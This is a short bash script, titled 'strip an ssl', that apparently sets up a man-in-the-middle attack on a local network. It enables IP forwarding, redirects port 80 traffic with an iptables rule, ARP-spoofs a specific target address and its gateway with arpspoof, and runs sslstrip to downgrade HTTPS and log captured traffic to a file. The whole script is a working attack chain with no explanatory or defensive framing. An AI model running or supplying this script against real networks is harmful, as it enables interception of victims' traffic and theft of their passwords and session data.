#!/bin/bash
#strip an ssl

echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-ports 10000
gnome-terminal -x arpspoof -i eth0 -t 194.75.54.160 194.75.54.129 &
sslstrip -l 10000 -w log.txt
